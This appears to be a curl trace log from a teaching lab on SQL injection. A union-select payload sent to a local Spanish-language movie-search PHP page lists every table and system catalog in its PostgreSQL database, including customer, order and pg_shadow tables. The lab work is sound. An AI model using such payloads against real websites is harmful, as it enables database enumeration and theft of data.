@@ -1,0 +1,207 @@
+$ curl "http://localhost/xSearchInjection.php?i_anio=1994%27%20and%201%3D0%20union%20all%20select%20relname%20as%20movietitle%20from%20pg_class%20--" --trace-ascii b.txt
+
+== Info:   Trying ::1...
+== Info: TCP_NODELAY set
+== Info: Connected to localhost (::1) port 80 (#0)
+=> Send header, 196 bytes (0xc4)
+0000: GET /xSearchInjection.php?i_anio=1994%27%20and%201%3D0%20union%2
+0040: 0all%20select%20relname%20as%20movietitle%20from%20pg_class%20--
+0080:  HTTP/1.1
+008b: Host: localhost
+009c: User-Agent: curl/7.57.0
+00b5: Accept: */*
+00c2: 
+<= Recv header, 17 bytes (0x11)
+0000: HTTP/1.1 200 OK
+<= Recv header, 17 bytes (0x11)
+0000: Host: localhost
+<= Recv header, 39 bytes (0x27)
+0000: Date: Tue, 19 Dec 2017 11:02:59 +0000
+<= Recv header, 19 bytes (0x13)
+0000: Connection: close
+<= Recv header, 25 bytes (0x19)
+0000: X-Powered-By: PHP/7.2.0
+<= Recv header, 40 bytes (0x28)
+0000: Content-type: text/html; charset=UTF-8
+<= Recv header, 2 bytes (0x2)
+0000: 
+<= Recv data, 4136 bytes (0x1028)
+0000: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> 
+0040: .<html>.  <head>.    <meta http-equiv="Content-Type" content="te
+0080: xt/html; charset=UTF-8">.    <title>Ejemplo de SQL injection</ti
+00c0: tle>.  </head>.  <body>.    <h2> Ejemplo de SQL injection: Infor
+0100: maci..n en la BD</h2>.      <form name="consultaanio" method="ge
+0140: t" action="xSearchInjection.php">.        Pel..culas del a..o: <
+0180: input name="i_anio"/><br/>.        <input type="submit" value="M
+01c0: ostrar"/>.      </form>.    <ol>.<li>pg_toast_21275</li>.<li>pg_
+0200: toast_21275_index</li>.<li>customers</li>.<li>customers_customer
+0240: id_seq</li>.<li>pg_toast_21283</li>.<li>pg_toast_21283_index</li
+0280: >.<li>imdb_actormovies</li>.<li>imdb_actors</li>.<li>imdb_actors
+02c0: _actorid_seq</li>.<li>pg_toast_21298</li>.<li>pg_toast_21298_ind
+0300: ex</li>.<li>imdb_movies</li>.<li>imdb_directormovies_directorid_
+0340: seq</li>.<li>imdb_directormovies_movieid_seq</li>.<li>imdb_direc
+0380: tors_directorid_seq</li>.<li>imdb_moviecountries_movieid_seq</li
+03c0: >.<li>imdb_moviegenres_movieid_seq</li>.<li>imdb_movies_movieid_
+0400: seq</li>.<li>inventory</li>.<li>pg_toast_21344</li>.<li>pg_toast
+0440: _21344_index</li>.<li>orderdetail</li>.<li>pg_toast_21350</li>.<
+0480: li>pg_toast_21350_index</li>.<li>orders</li>.<li>orders_orderid_
+04c0: seq</li>.<li>pg_toast_21358</li>.<li>pg_toast_21358_index</li>.<
+0500: li>products_movieid_seq</li>.<li>products_prod_id_seq</li>.<li>p
+0540: g_statistic</li>.<li>pg_type</li>.<li>customers_pkey</li>.<li>im
+0580: db_actormovies_pkey</li>.<li>imdb_actors_pkey</li>.<li>imdb_dire
+05c0: ctormovies_pkey</li>.<li>imdb_directors_pkey</li>.<li>imdb_movie
+0600: languages</li>.<li>products</li>.<li>inventory_pkey</li>.<li>ord
+0640: ers_pkey</li>.<li>products_pkey</li>.<li>imdb_directors</li>.<li
+0680: >pg_toast_2604</li>.<li>pg_toast_2604_index</li>.<li>pg_toast_26
+06c0: 06</li>.<li>pg_toast_2606_index</li>.<li>pg_toast_2609</li>.<li>
+0700: pg_toast_2609_index</li>.<li>pg_toast_1255</li>.<li>pg_toast_125
+0740: 5_index</li>.<li>pg_toast_2618</li>.<li>pg_toast_2618_index</li>
+0780: .<li>pg_toast_3596</li>.<li>pg_toast_3596_index</li>.<li>pg_toas
+07c0: t_2619</li>.<li>pg_toast_2619_index</li>.<li>pg_toast_2620</li>.
+0800: <li>pg_toast_2620_index</li>.<li>pg_toast_2396</li>.<li>pg_toast
+0840: _2396_index</li>.<li>pg_toast_2964</li>.<li>pg_toast_2964_index<
+0880: /li>.<li>pg_toast_3592</li>.<li>pg_toast_3592_index</li>.<li>pg_
+08c0: aggregate_fnoid_index</li>.<li>pg_am_name_index</li>.<li>pg_am_o
+0900: id_index</li>.<li>pg_amop_fam_strat_index</li>.<li>pg_amop_opr_f
+0940: am_index</li>.<li>pg_amop_oid_index</li>.<li>pg_amproc_fam_proc_
+0980: index</li>.<li>pg_amproc_oid_index</li>.<li>pg_attrdef_adrelid_a
+09c0: dnum_index</li>.<li>pg_attrdef_oid_index</li>.<li>pg_attribute_r
+0a00: elid_attnam_index</li>.<li>pg_attribute_relid_attnum_index</li>.
+0a40: <li>pg_authid_rolname_index</li>.<li>pg_authid_oid_index</li>.<l
+0a80: i>pg_auth_members_role_member_index</li>.<li>pg_auth_members_mem
+0ac0: ber_role_index</li>.<li>pg_cast_oid_index</li>.<li>imdb_movies_p
+0b00: key</li>.<li>pg_cast_source_target_index</li>.<li>pg_class_oid_i
+0b40: ndex</li>.<li>pg_class_relname_nsp_index</li>.<li>pg_class_tblsp
+0b80: c_relfilenode_index</li>.<li>pg_collation_name_enc_nsp_index</li
+0bc0: >.<li>pg_collation_oid_index</li>.<li>pg_constraint_conname_nsp_
+0c00: index</li>.<li>pg_constraint_conrelid_index</li>.<li>pg_constrai
+0c40: nt_contypid_index</li>.<li>pg_constraint_oid_index</li>.<li>pg_c
+0c80: onversion_default_index</li>.<li>pg_conversion_name_nsp_index</l
+0cc0: i>.<li>pg_conversion_oid_index</li>.<li>pg_database_datname_inde
+0d00: x</li>.<li>pg_database_oid_index</li>.<li>pg_depend_depender_ind
+0d40: ex</li>.<li>pg_depend_reference_index</li>.<li>pg_description_o_
+0d80: c_o_index</li>.<li>pg_shdescription_o_c_index</li>.<li>pg_enum_o
+0dc0: id_index</li>.<li>pg_enum_typid_label_index</li>.<li>pg_enum_typ
+0e00: id_sortorder_index</li>.<li>pg_index_indrelid_index</li>.<li>pg_
+0e40: index_indexrelid_index</li>.<li>pg_inherits_relid_seqno_index</l
+0e80: i>.<li>pg_inherits_parent_index</li>.<li>pg_init_privs_o_c_o_ind
+0ec0: ex</li>.<li>pg_language_name_index</li>.<li>pg_language_oid_inde
+0f00: x</li>.<li>pg_largeobject_loid_pn_index</li>.<li>pg_largeobject_
+0f40: metadata_oid_index</li>.<li>pg_namespace_nspname_index</li>.<li>
+0f80: pg_namespace_oid_index</li>.<li>pg_opclass_am_name_nsp_index</li
+0fc0: >.<li>pg_opclass_oid_index</li>.<li>pg_operator_oid_index</li>.<
+1000: li>pg_operator_oprname_l_r_n_index</li>.
+<= Recv data, 7120 bytes (0x1bd0)
+0000: <li>pg_opfamily_am_name_nsp_index</li>.<li>pg_opfamily_oid_index
+0040: </li>.<li>pg_pltemplate_name_index</li>.<li>pg_proc_oid_index</l
+0080: i>.<li>pg_proc_proname_args_nsp_index</li>.<li>pg_rewrite_oid_in
+00c0: dex</li>.<li>pg_rewrite_rel_rulename_index</li>.<li>pg_shdepend_
+0100: depender_index</li>.<li>pg_shdepend_reference_index</li>.<li>pg_
+0140: statistic_relid_att_inh_index</li>.<li>pg_tablespace_oid_index</
+0180: li>.<li>pg_tablespace_spcname_index</li>.<li>pg_transform_oid_in
+01c0: dex</li>.<li>pg_transform_type_lang_index</li>.<li>pg_trigger_tg
+0200: constraint_index</li>.<li>pg_trigger_tgrelid_tgname_index</li>.<
+0240: li>pg_trigger_oid_index</li>.<li>pg_event_trigger_evtname_index<
+0280: /li>.<li>pg_event_trigger_oid_index</li>.<li>pg_ts_config_cfgnam
+02c0: e_index</li>.<li>pg_ts_config_oid_index</li>.<li>pg_ts_config_ma
+0300: p_index</li>.<li>pg_ts_dict_dictname_index</li>.<li>pg_ts_dict_o
+0340: id_index</li>.<li>pg_ts_parser_prsname_index</li>.<li>pg_ts_pars
+0380: er_oid_index</li>.<li>pg_ts_template_tmplname_index</li>.<li>pg_
+03c0: ts_template_oid_index</li>.<li>pg_type_oid_index</li>.<li>pg_typ
+0400: e_typname_nsp_index</li>.<li>pg_foreign_data_wrapper_oid_index</
+0440: li>.<li>pg_foreign_data_wrapper_name_index</li>.<li>pg_foreign_s
+0480: erver_oid_index</li>.<li>pg_foreign_server_name_index</li>.<li>p
+04c0: g_user_mapping_oid_index</li>.<li>pg_user_mapping_user_server_in
+0500: dex</li>.<li>pg_foreign_table_relid_index</li>.<li>pg_default_ac
+0540: l_role_nsp_obj_index</li>.<li>pg_default_acl_oid_index</li>.<li>
+0580: pg_db_role_setting_databaseid_rol_index</li>.<li>pg_seclabel_obj
+05c0: ect_index</li>.<li>pg_shseclabel_object_index</li>.<li>pg_extens
+0600: ion_oid_index</li>.<li>pg_extension_name_index</li>.<li>pg_range
+0640: _rngtypid_index</li>.<li>pg_policy_oid_index</li>.<li>pg_policy_
+0680: polrelid_polname_index</li>.<li>pg_replication_origin_roiident_i
+06c0: ndex</li>.<li>pg_replication_origin_roname_index</li>.<li>pg_aut
+0700: hid</li>.<li>pg_shadow</li>.<li>imdb_directormovies</li>.<li>pg_
+0740: roles</li>.<li>imdb_moviegenres</li>.<li>email_uniqueness</li>.<
+0780: li>countries_pkey</li>.<li>countries_countryid_seq</li>.<li>imdb
+07c0: _moviecountries_pkey</li>.<li>countries</li>.<li>imdb_moviecount
+0800: ries</li>.<li>genres_pkey</li>.<li>genres_genreid_seq</li>.<li>i
+0840: mdb_moviegenres_pkey</li>.<li>genres</li>.<li>languages_pkey</li
+0880: >.<li>languages_languageid_seq</li>.<li>pg_settings</li>.<li>pg_
+08c0: file_settings</li>.<li>imdb_movielanguages_pkey</li>.<li>languag
+0900: es</li>.<li>pg_config</li>.<li>pg_rules</li>.<li>toppeli</li>.<l
+0940: i>orders_totalamount</li>.<li>pg_user_mapping</li>.<li>pg_stat_x
+0980: act_user_functions</li>.<li>pg_replication_origin_status</li>.<l
+09c0: i>pg_stat_archiver</li>.<li>pg_stat_bgwriter</li>.<li>pg_attribu
+0a00: te</li>.<li>pg_proc</li>.<li>pg_class</li>.<li>pg_attrdef</li>.<
+0a40: li>pg_constraint</li>.<li>pg_inherits</li>.<li>pg_index</li>.<li
+0a80: >pg_operator</li>.<li>pg_opfamily</li>.<li>pg_opclass</li>.<li>p
+0ac0: g_am</li>.<li>pg_amop</li>.<li>pg_amproc</li>.<li>pg_language</l
+0b00: i>.<li>pg_largeobject_metadata</li>.<li>pg_aggregate</li>.<li>pg
+0b40: _rewrite</li>.<li>pg_stat_progress_vacuum</li>.<li>pg_user_mappi
+0b80: ngs</li>.<li>pg_largeobject</li>.<li>pg_trigger</li>.<li>pg_even
+0bc0: t_trigger</li>.<li>pg_description</li>.<li>pg_cast</li>.<li>pg_e
+0c00: num</li>.<li>pg_namespace</li>.<li>pg_conversion</li>.<li>pg_dep
+0c40: end</li>.<li>pg_database</li>.<li>pg_db_role_setting</li>.<li>pg
+0c80: _tablespace</li>.<li>pg_pltemplate</li>.<li>pg_auth_members</li>
+0cc0: .<li>pg_shdepend</li>.<li>pg_shdescription</li>.<li>pg_ts_config
+0d00: </li>.<li>pg_ts_config_map</li>.<li>pg_ts_dict</li>.<li>pg_ts_pa
+0d40: rser</li>.<li>pg_ts_template</li>.<li>pg_extension</li>.<li>pg_f
+0d80: oreign_data_wrapper</li>.<li>pg_foreign_server</li>.<li>pg_forei
+0dc0: gn_table</li>.<li>pg_policy</li>.<li>pg_replication_origin</li>.
+0e00: <li>pg_default_acl</li>.<li>pg_init_privs</li>.<li>pg_seclabel</
+0e40: li>.<li>pg_shseclabel</li>.<li>pg_collation</li>.<li>pg_range</l
+0e80: i>.<li>pg_transform</li>.<li>pg_group</li>.<li>pg_user</li>.<li>
+0ec0: pg_policies</li>.<li>pg_views</li>.<li>pg_tables</li>.<li>pg_mat
+0f00: views</li>.<li>pg_indexes</li>.<li>pg_stats</li>.<li>pg_locks</l
+0f40: i>.<li>pg_cursors</li>.<li>pg_available_extensions</li>.<li>pg_a
+0f80: vailable_extension_versions</li>.<li>pg_prepared_xacts</li>.<li>
+0fc0: pg_prepared_statements</li>.<li>pg_seclabels</li>.<li>pg_stat_xa
+1000: ct_all_tables</li>.<li>pg_timezone_abbrevs</li>.<li>pg_timezone_
+1040: names</li>.<li>pg_stat_sys_tables</li>.<li>pg_stat_all_tables</l
+1080: i>.<li>pg_stat_xact_sys_tables</li>.<li>pg_stat_user_tables</li>
+10c0: .<li>pg_stat_xact_user_tables</li>.<li>pg_statio_all_tables</li>
+1100: .<li>pg_statio_sys_tables</li>.<li>pg_statio_user_tables</li>.<l
+1140: i>pg_stat_all_indexes</li>.<li>pg_stat_sys_indexes</li>.<li>pg_s
+1180: tat_user_indexes</li>.<li>pg_statio_all_indexes</li>.<li>pg_stat
+11c0: io_sys_indexes</li>.<li>pg_statio_user_indexes</li>.<li>pg_stati
+1200: o_all_sequences</li>.<li>pg_statio_sys_sequences</li>.<li>pg_sta
+1240: tio_user_sequences</li>.<li>pg_stat_activity</li>.<li>pg_stat_re
+1280: plication</li>.<li>pg_stat_wal_receiver</li>.<li>pg_stat_ssl</li
+12c0: >.<li>pg_replication_slots</li>.<li>pg_stat_database</li>.<li>pg
+1300: _stat_database_conflicts</li>.<li>pg_stat_user_functions</li>.<l
+1340: i>routine_privileges</li>.<li>information_schema_catalog_name</l
+1380: i>.<li>columns</li>.<li>applicable_roles</li>.<li>administrable_
+13c0: role_authorizations</li>.<li>key_column_usage</li>.<li>attribute
+1400: s</li>.<li>constraint_column_usage</li>.<li>character_sets</li>.
+1440: <li>check_constraint_routine_usage</li>.<li>check_constraints</l
+1480: i>.<li>constraint_table_usage</li>.<li>collations</li>.<li>colla
+14c0: tion_character_set_applicability</li>.<li>column_domain_usage</l
+1500: i>.<li>domain_constraints</li>.<li>column_privileges</li>.<li>co
+1540: lumn_udt_usage</li>.<li>parameters</li>.<li>domain_udt_usage</li
+1580: >.<li>domains</li>.<li>sequences</li>.<li>enabled_roles</li>.<li
+15c0: >referential_constraints</li>.<li>role_routine_grants</li>.<li>r
+1600: ole_column_grants</li>.<li>schemata</li>.<li>routines</li>.<li>p
+1640: g_toast_12241_index</li>.<li>pg_toast_12241</li>.<li>pg_toast_12
+1680: 246</li>.<li>sql_features</li>.<li>pg_toast_12246_index</li>.<li
+16c0: >sql_implementation_info</li>.<li>pg_toast_12251</li>.<li>pg_toa
+1700: st_12251_index</li>.<li>triggered_update_columns</li>.<li>sql_la
+1740: nguages</li>.<li>pg_toast_12256</li>.<li>pg_toast_12256_index</l
+1780: i>.<li>sql_packages</li>.<li>pg_toast_12261</li>.<li>pg_toast_12
+17c0: 261_index</li>.<li>sql_parts</li>.<li>pg_toast_12266</li>.<li>pg
+1800: _toast_12266_index</li>.<li>view_table_usage</li>.<li>sql_sizing
+1840: </li>.<li>pg_toast_12271</li>.<li>pg_toast_12271_index</li>.<li>
+1880: triggers</li>.<li>sql_sizing_profiles</li>.<li>table_constraints
+18c0: </li>.<li>user_defined_types</li>.<li>table_privileges</li>.<li>
+1900: udt_privileges</li>.<li>role_table_grants</li>.<li>tables</li>.<
+1940: li>transforms</li>.<li>role_udt_grants</li>.<li>view_column_usag
+1980: e</li>.<li>usage_privileges</li>.<li>role_usage_grants</li>.<li>
+19c0: data_type_privileges</li>.<li>view_routine_usage</li>.<li>views<
+1a00: /li>.<li>_pg_foreign_table_columns</li>.<li>element_types</li>.<
+1a40: li>_pg_foreign_data_wrappers</li>.<li>column_options</li>.<li>fo
+1a80: reign_data_wrapper_options</li>.<li>foreign_data_wrappers</li>.<
+1ac0: li>_pg_foreign_servers</li>.<li>foreign_server_options</li>.<li>
+1b00: foreign_servers</li>.<li>_pg_foreign_tables</li>.<li>foreign_tab
+1b40: le_options</li>.<li>foreign_tables</li>.<li>_pg_user_mappings</l
+1b80: i>.<li>user_mapping_options</li>.<li>user_mappings</li>.</ol>.  
+1bc0: </body>.</html>.
+== Info: Closing connection 0
